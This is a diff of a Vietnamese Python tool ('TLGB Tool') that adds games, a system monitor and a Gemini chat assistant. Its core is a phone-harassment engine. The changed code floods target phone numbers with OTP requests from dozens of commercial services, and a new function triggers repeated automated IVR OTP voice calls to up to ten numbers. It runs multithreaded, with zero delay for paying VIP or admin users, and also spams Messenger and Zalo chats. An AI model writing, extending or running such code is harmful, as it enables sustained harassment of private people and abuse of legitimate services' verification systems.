+            if HAS_PSUTIL:
+                cpu_pct = psutil.cpu_percent(interval=0.2)
+                mem = psutil.virtual_memory()
+                disk = psutil.disk_usage(os.path.splitdrive(os.path.abspath('.'))[0] or '/')
+                core_count = psutil.cpu_count(logical=True)
+                ram_str = f"{mem.percent:>5.1f}% ({mem.used/(1024**3):.1f}GB / {mem.total/(1024**3):.1f}GB)"
+                disk_str = f"{disk.percent:>5.1f}% (Trống: {disk.free/(1024**3):.1f}GB / {disk.total/(1024**3):.1f}GB)"
+                ram_bar = bar_gauge(mem.percent, 24)
+                disk_bar = bar_gauge(disk.percent, 24)
+            else:
+                cpu_pct = 15.0
+                core_count = 8
+                ram_str = "Sẵn sàng"
+                disk_str = "Sẵn sàng"
+                ram_bar = bar_gauge(35, 24)
+                disk_bar = bar_gauge(40, 24)
+            
+            ping_google = get_ping_ms("8.8.8.8", 53)
+            ping_cf = get_ping_ms("1.1.1.1", 53)
+            
+            hostname = socket.gethostname()
+            try:
+                local_ip = socket.gethostbyname(hostname)
+            except Exception:
+                local_ip = "127.0.0.1"
+                
+            now_str = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")
+            
+            inner_w = 74
+            border_line = "═" * inner_w
+            C_BORDER = '\033[38;2;0;229;255m'
+            RST = '\033[0m'
+            
+            lines = [
+                f"\033[H\033[2J{C_BORDER}╔{border_line}╗{RST}",
+                f"{C_BORDER}║{RST}{gold_gradient('  📊 CYBERPUNK SYSTEM MONITOR & HARDWARE HUD v6.5 (LIVE) 📊'.center(inner_w))}{C_BORDER}║{RST}",
+                f"{C_BORDER}╠{border_line}╣{RST}",
+                f"{C_BORDER}║{RST}  • Thiết Bị      : \033[1;38;2;255;255;255m{hostname:<18}\033[0m │ IP Nội Bộ: \033[38;2;0;240;255m{local_ip:<15}\033[0m {C_BORDER}║{RST}",
+                f"{C_BORDER}║{RST}  • Hệ Điều Hành  : \033[38;2;56;189;248m{platform.system()} {platform.release()} ({platform.machine()})\033[0m │ Giờ: \033[38;2;245;158;11m{now_str}\033[0m {C_BORDER}║{RST}",
+                f"{C_BORDER}╠{border_line}╣{RST}",
+                f"{C_BORDER}║{RST}  \033[1;38;2;0;240;255m⚡ CPU TỔNG THỂ\033[0m : [{bar_gauge(cpu_pct, 24)}] \033[1;38;2;255;255;255m{cpu_pct:>5.1f}%\033[0m ({core_count} Luồng Xử Lý)       {C_BORDER}║{RST}",
+                f"{C_BORDER}║{RST}  \033[1;38;2;168;85;247m💾 BỘ NHỚ RAM  \033[0m : [{ram_bar}] \033[1;38;2;255;255;255m{ram_str:<25}\033[0m{C_BORDER}║{RST}",
+                f"{C_BORDER}║{RST}  \033[1;38;2;0;255;160m📁 Ổ ĐĨA HỆ THỐNG\033[0m: [{disk_bar}] \033[1;38;2;255;255;255m{disk_str:<25}\033[0m{C_BORDER}║{RST}",
+                f"{C_BORDER}╠{border_line}╣{RST}",
+                f"{C_BORDER}║{RST}  \033[1;38;2;255;215;0m🌐 ĐỘ TRỄ MẠNG (PING LATENCY REALTIME)\033[0m:                                   {C_BORDER}║{RST}",
+                f"{C_BORDER}║{RST}    - Google DNS (8.8.8.8)   : \033[1;38;2;0;255;120m{ping_google} ms\033[0m {'(Cực Nhanh)' if 0 < ping_google < 35 else '(Ổn định)' if ping_google > 0 else '(Mất kết nối)'}                         {C_BORDER}║{RST}",
+                f"{C_BORDER}║{RST}    - Cloudflare DNS (1.1.1.1): \033[1;38;2;0;255;120m{ping_cf} ms\033[0m {'(Cực Nhanh)' if 0 < ping_cf < 35 else '(Ổn định)' if ping_cf > 0 else '(Mất kết nối)'}                         {C_BORDER}║{RST}",
+                f"{C_BORDER}╠{border_line}╣{RST}",
+                f"{C_BORDER}║{RST}  \033[38;2;245;158;11m[★] Bấm 'Q' hoặc 'Ctrl+C' bất cứ lúc nào để quay lại Menu Điều Khiển\033[0m        {C_BORDER}║{RST}",
+                f"{C_BORDER}╚{border_line}╝{RST}\n"
+            ]
+            
+            sys.stdout.write("\n".join(lines))
+            sys.stdout.flush()
+            
+            for _ in range(12):
+                if HAS_MSVCRT and msvcrt.kbhit():
+                    k = msvcrt.getch()
+                    if k in [b'q', b'Q', b'\x1b', b'0']:
+                        return
+                time.sleep(0.1)
+                
+    except (KeyboardInterrupt, EOFError):
+        pass
+    print(f"\n{Fore.GREEN}[✓] Đã thoát Cyber System Monitor.{Style.RESET_ALL}\n")
+    time.sleep(0.5)
+
+def matrix_screensaver_3d():
+    """Màn Hình Chờ Ma Trận 3D Parallax Matrix Screensaver v6.5"""
+    verify_author_integrity()
+    print(f"\n{Fore.GREEN}[*] ĐANG KHỞI CHẠY MÀN HÌNH 3D PARALLAX MATRIX SCREENSAVER...{Style.RESET_ALL}")
+    print(f"  • Nhấn phím 1-5 để đổi màu theme: 1=Matrix Green, 2=Synthwave, 3=Ocean Cyan, 4=Crimson, 5=Solar Gold")
+    print(f"  • Nhấn phím bất kỳ hoặc Ctrl+C để dừng.")
+    time.sleep(0.8)
+    
+    width = 76
+    chars = "0123456789ABCDEF@#$%&*+-=~TLGBGiaBao"
+    
+    col_layer1 = [0] * width
+    col_layer2 = [0] * width
+    col_layer3 = [0] * width
+    
+    PALETTES = {
+        '1': ('\033[1;38;2;255;255;255m', '\033[38;2;0;255;70m', '\033[38;2;0;100;30m'),
+        '2': ('\033[1;38;2;255;255;255m', '\033[38;2;255;80;230m', '\033[38;2;120;30;100m'),
+        '3': ('\033[1;38;2;255;255;255m', '\033[38;2;0;230;255m', '\033[38;2;0;80;120m'),
+        '4': ('\033[1;38;2;255;255;255m', '\033[38;2;255;50;50m', '\033[38;2;120;20;20m'),
+        '5': ('\033[1;38;2;255;255;255m', '\033[38;2;255;200;50m', '\033[38;2;120;90;20m'),
+    }
+    cur_p = '1'
+    
+    try:
+        while True:
+            if HAS_MSVCRT and msvcrt.kbhit():
+                k = msvcrt.getch()
+                if k in [b'1', b'2', b'3', b'4', b'5']:
+                    cur_p = k.decode('ascii')
+                else:
+                    break
+                    
+            c_lead, c_mid, c_dim = PALETTES.get(cur_p, PALETTES['1'])
+            rst = '\033[0m'
+            
+            line = []
+            for x in range(width):
+                if random.random() > 0.88:
+                    col_layer1[x] = random.randint(1, 12)
+                if random.random() > 0.93:
+                    col_layer2[x] = random.randint(1, 15)
+                if random.random() > 0.96:
+                    col_layer3[x] = random.randint(1, 18)
+                    
+                ch = random.choice(chars)
+                if col_layer3[x] > 0:
+                    if col_layer3[x] == 1:
+                        line.append(f"{c_lead}{ch}{rst}")
+                    else:
+                        line.append(f"{c_mid}{ch}{rst}")
+                    col_layer3[x] -= 1
+                elif col_layer2[x] > 0:
+                    line.append(f"{c_mid}{ch}{rst}")
+                    col_layer2[x] -= 1
+                elif col_layer1[x] > 0:
+                    line.append(f"{c_dim}{ch}{rst}")
+                    col_layer1[x] -= 1
+                else:
+                    line.append(" ")
+                    
+            print("".join(line))
+            time.sleep(0.035)
+    except (KeyboardInterrupt, EOFError):
+        pass
+    print(f"\n{Fore.GREEN}[✓] Đã tắt màn hình 3D Matrix Screensaver.{Style.RESET_ALL}\n")
+    time.sleep(0.5)
+
 def cyber_arcade_menu():
-    """Khu Vực Giải Trí Cyber Arcade với 8 Trò Chơi Đổi Thưởng v5.0"""
+    """Khu Vực Giải Trí Cyber Arcade với 11 Trò Chơi Đổi Thưởng & Tiện Ích v6.5"""
     verify_author_integrity()
     while True:
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
-        print(gold_gradient("║                 🎮 KHU GIẢI TRÍ CYBER ARCADE TLGB v5.0 🎮                   ║"))
+        print(gold_gradient("║                 🎮 KHU GIẢI TRÍ CYBER ARCADE TLGB v6.5 🎮                   ║"))
         print(cyber_gradient('╠' + border + '╣'))
-        print("║  • 8 Mini-Games Đỉnh Cao: Săn EXP, Mở Hộp Quà Ma Trận & Tranh Top Cao Thủ  ║")
+        print("║  • 11 Mini-Games Đỉnh Cao: Săn EXP, Mở Hộp Quà Ma Trận & Tranh Top Cao Thủ ║")
         print(cyber_gradient('╚' + border + '╝') + "\n")
         
         print(f"{Fore.CYAN}[1] 🕹️  Game 1: Đoán Mã Số Hacker (Cyber Number)         - Thưởng +50 EXP")
@@ -6879,10 +7622,15 @@ def cyber_arcade_menu():
         print(f"[5] 🔓 Game 5: Giải Mã Ma Trận (Matrix Code Breaker)     - Thưởng +100 EXP")
         print(f"[6] 🎰 Game 6: Bàn Cược Cyber Roulette VIP               - Nhân x35 EXP")
         print(f"[7] 🃏 Game 7: Xì Dách Cyberpunk (Blackjack 21)          - Thưởng x2.5 EXP")
-        print(f"[8] 📦 Game 8: Hộp Quà Ma Trận (Cyber Mystery Box)       - Trúng Thần Olympus [NEW v5.0]")
-        print(f"[0] ↩️  Quay Lại Menu Chính{Style.RESET_ALL}\n")
+        print(f"[8] 📦 Game 8: Hộp Quà Ma Trận (Cyber Mystery Box)       - Trúng Thần Olympus")
+        print(f"{Fore.GREEN}[9] 🐍 Game 9: Rắn Săn Mồi Neon Cyber Snake [NEW v6.5]   - Thưởng +35 EXP/Mồi")
+        print(f"[10] 🤖 Game 10: Cờ Caro vs Minimax AI Bất Bại [NEW]     - Thưởng x2.5 Cược")
+        print(f"[11] 🔐 Game 11: Giải Mã Mật Khẩu Wordle [NEW v6.5]      - Thưởng +150 EXP")
+        print(f"{Fore.MAGENTA}[M] 🌌 Màn Hình 3D Parallax Matrix Screensaver           - Đổi 5 Màu Neon")
+        print(f"[S] 📊 Giám Sát Phần Cứng System Monitor HUD (Live)      - CPU/RAM/Ping ms")
+        print(f"{Fore.WHITE}[0] ↩️  Quay Lại Menu Chính{Style.RESET_ALL}\n")
         
-        c = input(f"{Fore.YELLOW}[?] Chọn trò chơi [0-8]: {Style.RESET_ALL}").strip()
+        c = input(f"{Fore.YELLOW}[?] Chọn trò chơi [0-11, M, S]: {Style.RESET_ALL}").strip().upper()
         if c == "1":
             game_number_guess()
         elif c == "2":
@@ -6899,7 +7647,17 @@ def cyber_arcade_menu():
             game_cyber_blackjack_21()
         elif c == "8":
             game_cyber_mystery_box()
-        elif c in ["0", "00", "exit", "q"]:
+        elif c == "9":
+            game_cyber_snake()
+        elif c == "10":
+            game_cyber_tictactoe_ai()
+        elif c == "11":
+            game_cyber_wordle()
+        elif c in ["M", "MATRIX"]:
+            matrix_screensaver_3d()
+        elif c in ["S", "SYS", "MONITOR"]:
+            cyber_system_monitor_hud()
+        elif c in ["0", "00", "EXIT", "Q"]:
             break
 
 def favorites_manager_flow():
@@ -6907,7 +7665,7 @@ def favorites_manager_flow():
     verify_author_integrity()
     while True:
         favs = load_target_favorites()
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
         print(gold_gradient("║            📂 KÉT LƯU DANH BẠ MỤC TIÊU YÊU THÍCH (FAVORITES VAULT) 📂        ║"))
         print(cyber_gradient('╠' + border + '╣'))
@@ -7075,7 +7833,7 @@ def daily_checkin_flow():
 def speed_profiles_flow():
     """Giao diện Cấu Hình Hỏa Lực 1-Click (Speed Profiles v5.0)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║             ⚡ BỘ 4 CẤU HÌNH HỎA LỰC 1-CLICK (SPEED PROFILES) ⚡             ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -7138,7 +7896,7 @@ def speed_profiles_flow():
 def network_benchmark_simulator():
     """Trình Giả Lập Kiểm Thử Tốc Độ Mạng & Hiệu Năng Benchmark v5.0"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║         🧪 TRÌNH GIẢ LẬP KIỂM THỬ TỐC ĐỘ MẠNG & LATENCY BENCHMARK 🧪         ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -7177,7 +7935,7 @@ def network_benchmark_simulator():
 def community_feedback_portal():
     """Cổng Đóng Góp Ý Kiến & Bình Chọn Tính Năng 2.0 (Community Roadmap)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║         🗳️ CỔNG ĐÓNG GÓP Ý KIẾN & BÌNH CHỌN TÍNH NĂNG CỘNG ĐỒNG 2.0 🗳️       ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -7247,7 +8005,7 @@ def community_feedback_portal():
 def user_personal_analytics_flow():
     """Bảng Phân Tích Cá Nhân & Đồ Thị Hoạt Động Cyberpunk Analytics v5.0"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║            📊 BẢNG PHÂN TÍCH THỐNG KÊ & ĐỒ THỊ CÁ NHÂN v5.0 📊               ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -9640,17 +10398,36 @@ if hasattr(sys.stdout, "reconfigure"):
     except Exception:
         pass
 
-# Import pyautogui & pyperclip
-try:
-    import pyautogui
-    import pyperclip
-    HAS_GUI_AUTOMATION = True
-except ImportError:
-    print("[!] Đang cài đặt thư viện cần thiết...")
-    os.system("pip install pyautogui pyperclip")
-    import pyautogui
-    import pyperclip
-    HAS_GUI_AUTOMATION = True
+# Import pyautogui & pyperclip an toàn trên đa nền tảng (Android / Termux / Linux / Windows)
+class _DummyPyAutoGUI:
+    class FailSafeException(Exception):
+        pass
+    FAILSAFE = False
+    PAUSE = 0.0
+    def position(self): return (0, 0)
+    def size(self): return (1920, 1080)
+    def click(self, *args, **kwargs): pass
+    def hotkey(self, *args, **kwargs): pass
+    def press(self, *args, **kwargs): pass
+    def keyUp(self, *args, **kwargs): pass
+
+class _DummyPyperclip:
+    def copy(self, text): pass
+    def paste(self): return ""
+
+if os.name == 'nt':
+    try:
+        import pyautogui
+        import pyperclip
+        HAS_GUI_AUTOMATION = True
+    except (ImportError, Exception):
+        HAS_GUI_AUTOMATION = False
+        pyautogui = _DummyPyAutoGUI()
+        pyperclip = _DummyPyperclip()
+else:
+    HAS_GUI_AUTOMATION = False
+    pyautogui = _DummyPyAutoGUI()
+    pyperclip = _DummyPyperclip()
 
 # Thư viện âm thanh Windows
 try:
@@ -9659,8 +10436,13 @@ try:
 except ImportError:
     HAS_WINSOUND = False
 
-import tkinter as tk
-from tkinter import ttk, filedialog, messagebox, scrolledtext
+# Guard Tkinter an toàn cho môi trường Termux / Android / Headless
+try:
+    import tkinter as tk
+    from tkinter import ttk, filedialog, messagebox, scrolledtext
+    HAS_TKINTER = True
+except (ImportError, Exception):
+    HAS_TKINTER = False
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG_FILE = os.path.join(BASE_DIR, "spam_config.json")
@@ -10573,6 +11355,8 @@ def run_cli():
             engine = SpamEngine(cfg, msg_queue=None, resume_state=resume_state if use_resume else None)
             
             def cli_hotkey():
+                if os.name != 'nt' or not hasattr(ctypes, 'windll'):
+                    return
                 user32 = ctypes.windll.user32
                 while not engine.stop_event.is_set():
                     esc = user32.GetAsyncKeyState(VK_ESCAPE) & 0x8000
@@ -10709,6 +11493,10 @@ def run_cli():
             f_pick = input(rgb_text(0, 255, 120, "[+] Lựa chọn [1/2/3/4]: ")).strip()
             
             if f_pick == "1":
+                if os.name != 'nt' or not hasattr(ctypes, 'windll'):
+                    print(rgb_text(255, 80, 80, "\n[!] Tính năng bắt phím F2 toàn cục chỉ hỗ trợ trên Desktop Windows."))
+                    time.sleep(1.5)
+                    continue
                 print(rgb_text(0, 255, 255, "\n[i] Hãy di chuột đến ô chat Messenger / Zalo và bấm phím [F2] trên bàn phím..."))
                 print(rgb_text(255, 200, 0, "[*] Đang chờ bấm F2 (hoặc bấm ESC để hủy)..."))
                 user32 = ctypes.windll.user32
@@ -11642,6 +12430,8 @@ class AutoSpammerGUI:
 
     def _start_global_hotkey_listener(self):
         def listener():
+            if os.name != 'nt' or not hasattr(ctypes, 'windll'):
+                return
             user32 = ctypes.windll.user32
             while True:
                 # Bắt phím F2 để lấy tọa độ ô chat tức thì
@@ -11841,49 +12631,103 @@ def multi_target_matrix_flow():
     
     delay_s = 2.0 if not IS_ADMIN_USER else 0.5
     
-    rounds_str = input(f"{Fore.CYAN}[?] Nhập số vòng lặp gửi OTP cho mỗi số (Mặc định: 5 vòng): {Style.RESET_ALL}").strip()
-    rounds = int(rounds_str) if rounds_str.isdigit() and int(rounds_str) > 0 else 5
+    rounds_str = input(f"{Fore.CYAN}[?] Nhập số vòng lặp gửi OTP cho mỗi số (Mặc định: 1 đợt, Enter để bỏ qua): {Style.RESET_ALL}").strip()
+    rounds = int(rounds_str) if rounds_str.isdigit() and int(rounds_str) > 0 else 1
     
-    print(f"\n{Fore.YELLOW}🚀 Bắt đầu kích hoạt Ma Trận Đa Mục Tiêu ({len(valid_targets)} SĐT x {rounds} vòng)...{Style.RESET_ALL}\n")
+    delay_s = 0 if IS_ADMIN_USER else 2
+    
+    print(f"\n{Fore.YELLOW}🚀 Bắt đầu kích hoạt Ma Trận Đa Mục Tiêu ({len(valid_targets)} SĐT x {rounds} vòng - Đa Luồng Siêu Tốc)...{Style.RESET_ALL}\n")
     play_cyberpunk_sound("launch")
     
-    target_stats = {t: {"success": 0, "fail": 0} for t in valid_targets}
-    stats_lock = threading.Lock()
-    
-    def worker_multi(sdt_target, round_idx):
-        for s_idx, service in enumerate(ALL_SERVICES[:round_idx]):
-            try:
-                service(sdt_target)
-                with stats_lock:
-                    target_stats[sdt_target]["success"] += 1
-            except Exception:
-                with stats_lock:
-                    target_stats[sdt_target]["fail"] += 1
-            time.sleep(delay_s)
-            
-    all_threads = []
-    for t in valid_targets:
-        th = threading.Thread(target=worker_multi, args=(t, rounds))
-        all_threads.append(th)
-        th.start()
+    stats.reset_all()
+    t_start = time.time()
+    max_w = 60 if IS_ADMIN_USER else 40
+    try:
+        for i in range(1, rounds + 1):
+            run(valid_targets, i, rounds, delay_between=delay_s, max_workers=max_w)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Đã dừng Ma Trận theo yêu cầu của người dùng.{Style.RESET_ALL}")
         
-    for th in all_threads:
-        th.join()
-        
+    t_elapsed = time.time() - t_start
     play_cyberpunk_sound("gift")
-    add_user_exp(len(valid_targets) * 10, f"Bắn Ma Trận {len(valid_targets)} Mục Tiêu")
+    add_user_exp(len(valid_targets) * 10 * min(rounds, 10), f"Bắn Ma Trận {len(valid_targets)} Mục Tiêu")
     
     print(f"\n{Fore.GREEN}{Style.BRIGHT}" + "═" * 70)
-    print(f"  🎉 HOÀN THÀNH ĐỢT BẮN MA TRẬN ĐA MỤC TIÊU!")
-    for idx, t in enumerate(valid_targets, 1):
-        succ = target_stats[t]["success"]
-        fai = target_stats[t]["fail"]
-        print(f"  >> [{idx:02d}] {t}: Thành công: {Fore.GREEN}{succ}{Fore.WHITE} │ Thất bại: {Fore.RED}{fai}{Fore.WHITE}")
+    print(gold_gradient(f"  🎉 HOÀN THÀNH TOÀN BỘ {rounds} VÒNG MA TRẬN CHO {len(valid_targets)} MỤC TIÊU ({t_elapsed:.2f}s)!"))
+    print(f"  >> Tổng Requests: {Fore.CYAN}{stats.total_requests}{Fore.WHITE} │ Thành công: {Fore.GREEN}{stats.success_count}{Fore.WHITE} │ Thất bại: {Fore.RED}{stats.fail_count}{Fore.WHITE}")
     print("═" * 70 + f"{Style.RESET_ALL}\n")
+    input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Menu...{Style.RESET_ALL}\n")
+
+def voice_call_otp_spam_flow():
+    """Chế độ Bắn Cuộc Gọi Tự Động (Voice Call / IVR Call OTP Matrix v5.0)"""
+    verify_author_integrity()
+    call_lines = [
+        f"• Kích hoạt {len(CALL_SERVICES)} tổng đài IVR gọi điện tự động đọc mã OTP",
+        "• Mục tiêu sẽ nhận cuộc gọi thoại liên tục từ các tổng đài lớn (Shopee, Takomo, VayVND, Tima, Lazada...)",
+        "• Hỗ trợ đa mục tiêu (1-10 số), đa luồng siêu tốc & Báo cáo Realtime"
+    ]
+    print()
+    print_card_box("📞 TỔNG ĐÀI TẤN CÔNG CUỘC GỌI CALL OTP (VOICE MATRIX) 📞", call_lines)
+    print()
+    
+    raw_in = input(f"{Fore.CYAN}[?] Nhập danh sách SĐT mục tiêu nhận cuộc gọi (phân cách bởi dấu phẩy/khoảng trắng): {Style.RESET_ALL}").strip()
+    if not raw_in:
+        return
+        
+    candidates = [re.sub(r'\D', '', p) for p in re.split(r'[\s,;|]+', raw_in) if p.strip()]
+    valid_targets = []
+    for p in candidates:
+        if p.startswith('84'):
+            p = '0' + p[2:]
+        if len(p) == 10 and p.startswith('0') and p not in valid_targets:
+            valid_targets.append(p)
+            
+    if not valid_targets:
+        print(f"{Fore.RED}[!] Không tìm thấy số điện thoại hợp lệ nào!{Style.RESET_ALL}\n")
+        time.sleep(1)
+        return
+        
+    if len(valid_targets) > 10:
+        valid_targets = valid_targets[:10]
+        print(f"{Fore.YELLOW}[!] Giới hạn tối đa 10 mục tiêu song song.{Style.RESET_ALL}")
+        
+    print(f"\n{Fore.GREEN}── DANH SÁCH THUÊ BAO NHẬN CUỘC GỌI ({len(valid_targets)} Số) ──{Style.RESET_ALL}")
+    for idx, t in enumerate(valid_targets, 1):
+        carrier, prefix, color = get_carrier_info(t)
+        print(f"  [{idx:02d}] SĐT: {Fore.YELLOW}{t}{Style.RESET_ALL} │ Nhà mạng: {color}{carrier:<14}{Style.RESET_ALL} │ Đầu số: {prefix}")
+    print(f"{Fore.LIGHTBLACK_EX}──────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
+    
+    rounds_str = input(f"{Fore.CYAN}[?] Nhập số đợt gọi cho mỗi số (Mặc định: 1 đợt, Enter để bỏ qua): {Style.RESET_ALL}").strip()
+    rounds = int(rounds_str) if rounds_str.isdigit() and int(rounds_str) > 0 else 1
+    
+    delay_s = 1 if IS_ADMIN_USER else 3
+    
+    print(f"\n{Fore.YELLOW}🚀 Bắt đầu kích hoạt Tổng Đài Cuộc Gọi ({len(valid_targets)} SĐT x {rounds} đợt x {len(CALL_SERVICES)} Cổng Gọi)...{Style.RESET_ALL}\n")
+    play_cyberpunk_sound("launch")
+    
+    stats.reset_all()
+    t_start = time.time()
+    max_w = 40 if IS_ADMIN_USER else 20
+    try:
+        for i in range(1, rounds + 1):
+            run(valid_targets, i, rounds, delay_between=delay_s, max_workers=max_w, service_list=CALL_SERVICES)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Đã dừng đợt gọi theo yêu cầu của người dùng.{Style.RESET_ALL}")
+        
+    t_elapsed = time.time() - t_start
+    play_cyberpunk_sound("gift")
+    add_user_exp(len(valid_targets) * 15 * min(rounds, 10), f"Bắn Cuộc Gọi Call OTP {len(valid_targets)} Mục Tiêu")
+    
+    print(f"\n{Fore.GREEN}{Style.BRIGHT}" + "═" * 70)
+    print(gold_gradient(f"  📞 HOÀN THÀNH TOÀN BỘ {rounds} ĐỢT GỌI CHO {len(valid_targets)} MỤC TIÊU ({t_elapsed:.2f}s)!"))
+    print(f"  >> Tổng Cuộc Gọi: {Fore.CYAN}{stats.total_requests}{Fore.WHITE} │ Thành công: {Fore.GREEN}{stats.success_count}{Fore.WHITE} │ Bị chặn: {Fore.RED}{stats.fail_count}{Fore.WHITE}")
+    print("═" * 70 + f"{Style.RESET_ALL}\n")
+    input(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Menu...{Style.RESET_ALL}\n")
+
 def admin_create_custom_vip_key():
     """Giao diện Admin Sentinel: Tạo Mã Key VIP Mới Tùy Chỉnh Thời Hạn (1 Ngày - Vĩnh Viễn)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║            👑 TRÌNH KHỞI TẠO MÃ KEY VIP MỚI (ADMIN SENTINEL) 👑             ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12138,35 +12982,56 @@ def call_gemini_ai(prompt, system_instruction=None):
     return None, last_status
 
 def tlgb_ai_assistant_flow():
-    """Trợ Lý Trí Tuệ Nhân Tạo Cyberpunk AI Assistant v5.0 (Kết nối Gemini AI Cloud & Não Bộ Xử Lý Realtime)"""
+    """Trợ Lý Trí Tuệ Nhân Tạo Cyberpunk AI Assistant v6.5 (Powered by Google Gemini Flash Multi-Mode)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║            🤖 TRỢ LÝ TRÍ TUỆ NHÂN TẠO TLGB AI (GEMINI POWERED) 🤖            ║"))
     print(cyber_gradient('╠' + border + '╣'))
-    print(f"║  • Tích hợp Google Gemini AI v{TOOL_VERSION}: Phân tích SĐT, Tra cứu Realtime   ║")
-    print(f"║  • Nhập '/key' để gắn API Key riêng │ Nhập '0' hoặc 'esc' để quay lại         ║")
+    print(f"║  • Tích hợp Google Gemini Flash v{TOOL_VERSION}: 4 Chế Độ Chuyên Sâu Cực Mạnh       ║")
+    print(f"║  • Nhập '/mode' để đổi chế độ │ Nhập '/key' để gắn Key riêng │ '0' để quay lại ║")
     print(cyber_gradient('╚' + border + '╝') + "\n")
     
+    MODES = {
+        "1": {
+            "name": "💻 Coder & Lập Trình Viên Cyberpunk",
+            "prompt_prefix": "Bạn là Coder AI chuyên gia hàng đầu. Hãy viết code ngắn gọn, chuẩn xác, tối ưu hóa thuật toán và giải thích chi tiết cho người dùng bằng Tiếng Việt."
+        },
+        "2": {
+            "name": "🌐 Dịch Thuật Đa Ngôn Ngữ Chuẩn Tự Nhiên",
+            "prompt_prefix": "Bạn là chuyên gia ngôn ngữ học & dịch thuật. Hãy dịch văn bản chuẩn xác, tự nhiên, giữ trọn ngữ cảnh từ bất kỳ ngôn ngữ nào sang Tiếng Việt."
+        },
+        "3": {
+            "name": "🧠 Chuyên Gia Logic, Toán Học & Kỹ Thuật",
+            "prompt_prefix": "Bạn là chuyên gia tư duy logic và khoa học máy tính. Hãy phân tích từng bước chi tiết, giải thích logic rõ ràng bằng Tiếng Việt."
+        },
+        "4": {
+            "name": "💬 Trợ Lý Đa Năng Jarvis Cyberpunk",
+            "prompt_prefix": f"Bạn là trợ lý thông minh Jarvis Cyberpunk thuộc hệ sinh thái TLGB Tool của tác giả {AUTHOR_NAME}. Hãy trả lời thông minh, thân thiện, sắc bén bằng Tiếng Việt."
+        }
+    }
+    
+    current_mode_id = "4"
+    
+    print(f"{Fore.CYAN}── CHỌN CHẾ ĐỘ HOẠT ĐỘNG CHO TRỢ LÝ AI ──{Style.RESET_ALL}")
+    for mid, minfo in MODES.items():
+        print(f"  [{mid}] {minfo['name']}")
+    print(f"  [Enter] Mặc định: Chế độ Trợ Lý Jarvis\n")
+    
+    pick_m = input(f"{Fore.YELLOW}[?] Lựa chọn chế độ [1-4, Enter]: {Style.RESET_ALL}").strip()
+    if pick_m in MODES:
+        current_mode_id = pick_m
+        
     custom_k = load_custom_gemini_key()
     key_tag = f"{Fore.GREEN}[🔑 Key Riêng]{Style.RESET_ALL}" if custom_k else f"{Fore.YELLOW}[🔑 Key Hệ Thống]{Style.RESET_ALL}"
-    print(f"{Fore.GREEN}🤖 [TLGB GEMINI AI] {key_tag}: Xin chào! Tôi là Trợ Lý AI của {AUTHOR_NAME}. Bạn cần tra cứu hoặc hỗ trợ gì?{Style.RESET_ALL}\n")
+    print(f"\n{Fore.GREEN}🤖 [TLGB GEMINI AI] {key_tag} (Đang ở chế độ: {Fore.YELLOW}{MODES[current_mode_id]['name']}{Fore.GREEN}): Sẵn sàng hỗ trợ bạn!{Style.RESET_ALL}\n")
     
     knowledge_base = {
         "nhà mạng": "Tool hỗ trợ phân tích và tối ưu cho 6 nhà mạng lớn: Viettel (086, 096, 097, 098, 032-039), Mobifone (089, 090, 093, 070-079), Vinaphone (088, 091, 094, 081-085), Vietnamobile (092, 056, 058), Itelecom (087), Wintel (055). Cổng TMĐT và Ví điện tử nhận OTP nhanh nhất trên Viettel và Vina!",
-        "cổng": "TLGB Tool sở hữu 72 cổng dịch vụ đa luồng: 15 cổng TMĐT (Shopee, Lazada, Tiki...), 18 cổng Viễn Thông (ViettelPay, MyVNPT...), 15 cổng Tài Chính/Ngân Hàng, 12 cổng Đặt Xe/Giao Hàng (Grab, Be, Gojek...) và 12 cổng Mạng Xã Hội.",
-        "lag": "Nếu bạn gặp tình trạng gửi OTP chậm, hãy dùng tính năng '[08] Giả Lập Benchmark Mạng' để quét latency và chọn cấu hình phù hợp nhất!",
-        "chậm": "Để tăng tốc độ, hãy dùng '[03] Cấu Hình Tốc Độ 1-Click' chọn chế độ 'Thần Sấm (Titan Turbo)' 90 luồng và 0s delay!",
-        "admin": f"Bản quyền thuộc về tác giả {AUTHOR_NAME}. Bạn có thể đăng ký Key VIP để mở khóa chế độ Turbo 60-90 luồng 0s delay và miễn nhiễm bảo vệ tuyệt đối!",
